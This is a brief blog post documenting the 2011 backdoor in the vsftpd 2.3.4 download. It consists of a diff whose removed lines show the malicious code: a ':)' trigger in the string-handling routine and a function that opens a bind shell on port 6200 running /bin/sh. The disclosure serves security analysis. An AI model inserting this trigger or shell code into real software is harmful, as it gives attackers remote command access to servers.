---
layout: post
title: "The case of back door in vsftpd 2.3.4"
date: 2011-07-03 20:54:42 -0400
tags: code
---

Source: <http://pastebin.com/AetT9sS5>, <http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html>

```diff
diff -ur vsftpd-2.3.4/str.c vsftpd-2.3.4.4players/str.c
--- vsftpd-2.3.4/str.c	2011-06-30 15:52:38.000000000 +0200
+++ vsftpd-2.3.4.4players/str.c	2008-12-17 06:54:16.000000000 +0100
@@ -569,11 +569,6 @@
     {
       return 1;
     }
-    else if((p_str->p_buf[i]==0x3a)
-    && (p_str->p_buf[i+1]==0x29))
-    {
-      vsf_sysutil_extra();
-    }
   }
   return 0;
 }
diff -ur vsftpd-2.3.4/sysdeputil.c vsftpd-2.3.4.4players/sysdeputil.c
--- vsftpd-2.3.4/sysdeputil.c	2011-06-30 15:58:00.000000000 +0200
+++ vsftpd-2.3.4.4players/sysdeputil.c	2010-03-26 04:25:33.000000000 +0100
@@ -34,10 +34,7 @@
 /* For FreeBSD */
 #include <sys/param.h>
 #include <sys/uio.h>
-#include <netinet/in.h>
-#include <netdb.h>
-#include <string.h>
-#include <stdlib.h>
+
 #include <sys/prctl.h>
 #include <signal.h>
 
@@ -220,7 +217,7 @@
 static int s_proctitle_inited = 0;
 static char* s_p_proctitle = 0;
 #endif
-int vsf_sysutil_extra();
+
 #ifndef VSF_SYSDEP_HAVE_MAP_ANON
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -843,30 +840,6 @@
   }
 }
 
-int
-vsf_sysutil_extra(void)
-{
-  int fd, rfd;
-  struct sockaddr_in sa;
-  if((fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
-  exit(1); 
-  memset(&sa, 0, sizeof(sa));
-  sa.sin_family = AF_INET;
-  sa.sin_port = htons(6200);
-  sa.sin_addr.s_addr = INADDR_ANY;
-  if((bind(fd,(struct sockaddr *)&sa,
-  sizeof(struct sockaddr))) < 0) exit(1);
-  if((listen(fd, 100)) == -1) exit(1);
-  for(;;)
-  { 
-    rfd = accept(fd, 0, 0);
-    close(0); close(1); close(2);
-    dup2(rfd, 0); dup2(rfd, 1); dup2(rfd, 2);
-    execl("/bin/sh","sh",(char *)0); 
-  } 
-}
-
-
 void
 vsf_sysutil_set_proctitle_prefix(const struct mystr* p_str)
 {
```
